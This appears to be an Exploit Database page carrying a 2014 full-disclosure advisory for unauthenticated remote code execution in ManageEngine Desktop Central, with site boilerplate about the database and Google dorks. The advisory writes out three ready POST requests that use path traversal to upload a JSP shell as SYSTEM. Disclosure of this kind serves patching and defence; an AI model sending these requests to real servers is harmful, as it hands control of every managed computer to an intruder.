        This module exploits an arbitrary file upload vulnerability in ManageEngine DesktopCentral
        v7 to v9 build 90054 (including the MSP versions).
        A malicious user can upload a JSP file into the web root without authentication, leading to
        arbitrary code execution as SYSTEM. Some early builds of version 7 are not exploitable as
        they do not ship with a bundled Java compiler.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

```
Hi,

This is the 3rd part of the ManageOwnage series. For previous chapters see:
<http://seclists.org/fulldisclosure/2014/Aug/55>
<http://seclists.org/fulldisclosure/2014/Aug/75>

tl;dr
CVE-2014-5005, 5006 and 5007 - RCE via file upload in Desktop Central
Metasploit module will be released soon.
A copy of the advisory below is available in my repo at
<https://raw.githubusercontent.com/pedrib/PoC/master/me_dc9_file_upload.txt>

"Desktop Central is an integrated desktop & mobile device management
software that helps in managing the servers, laptops, desktops,
smartphones and tablets from a central point. It automates your
regular desktop management routines like installing patches,
distributing software, managing your IT Assets, managing software
licenses, monitoring software usage statistics, managing USB device
usage, taking control of remote desktops, and more."

There are several vulnerable servers are out there if you know the
Google dorks. Quoting the author of the Internet Census 2012: "As a
rule of thumb, if you believe that "nobody would connect that to the
Internet, really nobody", there are at least 1000 people who did."
These vulnerabilities can be abused to achieve remote code execution
as SYSTEM in Windows. I've updated the desktopcentral_file_upload
Metasploit module to use the new statusUpdate technique. Needless to
say, owning a Desktop Central box will give you control of all the
computers and smartphones it manages.

#1
Vulnerability: Remote code execution as SYSTEM via file upload (unauthenticated)
Constraints: none; no authentication or any other information needed

a)
CVE-2014-5005
Affected versions: all versions from v7 to v9 build 90054
Fix: Upgrade to DC v9 build 90055
POST /statusUpdate?actionToCall=LFU&customerId=1337&fileName=../../../../../../shell.jsp&configDataID=1
<... your favourite jsp shell here ...>

b)
CVE-2014-5006
Affected versions: all versions from v8 to v9 build 90054
Fix: Upgrade to DC v9 build 90055
POST /mdm/mdmLogUploader?filename=..\\..\\..\webapps\\DesktopCentral\\shell.jsp
<... your favourite jsp shell here ...>

#2
CVE-2014-5007
Vulnerability: Remote code execution as SYSTEM via file upload (unauthenticated)
Constraints: no authentication needed; need to know valid
computerName, domainName and customerId
Affected versions: all versions from v7 to v9 build 90054
Fix: Upgrade to DC v9 build 90055
Notes: This was previously discovered as CVE-2013-7390 / OSVDB-10008
by Thomas Hibbert, and was "fixed" in 2013-11-09. The fix is
incomplete and it is still possible to upload a shell with a valid
computerName, domainName and customerId.

POST
/agentLogUploader?computerName=whatever1&domainName=whatever2&customerId=1337&filename=..\\..\\..\\..\\webapps\\DesktopCentral\\shell.jsp
<... your favourite jsp shell here ...>
